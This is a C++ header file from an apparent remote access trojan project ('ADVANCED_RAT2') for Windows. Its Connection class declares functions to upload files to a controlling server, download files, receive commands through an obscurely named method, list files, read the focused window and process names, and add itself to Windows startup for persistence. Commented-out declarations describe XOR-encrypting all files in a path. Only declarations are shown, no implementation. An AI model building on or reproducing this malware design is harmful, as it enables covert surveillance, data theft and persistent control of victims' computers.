//
// Created by avita on 07/08/2020.
//

#define WIN32_LEAN_AND_MEAN


#ifndef ADVANCED_RAT2_CONNECTION_H
#define ADVANCED_RAT2_CONNECTION_H


#include <iostream>
#include <string>
#include <cstring>
#include <vector>
#include <memory>
#include <fstream>
#include <WS2tcpip.h>
#include <windows.h>
#include<algorithm>
#include <tchar.h>
#include <Lmcons.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <filesystem>

#define BUFFER_SIZE 1024
#define FILE_WAS_SENT      "100@" //The file was sent
#define CANT_OPEN_FILE     "200@" //Cant open the file successfully
#define COMMAND_NOT_FOUND  "300@" // Cant open find the command
#define CANT_OPEN_HANDLE   "400@" // Cant open handle
#define HANDLE_WAS_OPENED  "500@" //Handle was opened successfully

#pragma warning(disable:4996)
#pragma comment (lib, "Ws2_32.lib")

using namespace std;

class Connection {
    string ip;
    int port;
    SOCKET sock;


public:
    //Initialize ip and string
    Connection(string ip, unsigned int port);

    //Sending the file in path to the server
    void sendFile(string path);

    //Getting file from the server and save it in path
    void recvFile(string path);

    //Sending data to the server
    void sendMessage(const char *data);

    //Getting command from the server
    string e1(string &b1);

    //Saving all files in path
    string Connection::getAllFiles(string path);

    //Encrypt data with xor encryption with key
    //string encryptData(string data, string key);

    //Encrypt all the files in path with xor
    //void encryptFiles(string path);

    //Read file in path
    //string readFile(filesystem::path path);

    //Write data to a file in path
    //void writeToFile(filesystem::path path, string data);

    //Starting the first connection

    int startConnection();

    //Creating the connection
    void connection();


    //Get process name by his PID
    string getProcessName(int pid);

    //Get the name of the focus window
    string getFocusWindowName();

    //Opening the exe file in windows startup
    int boot();


};


#endif //ADVANCED_RAT2_CONNECTION_H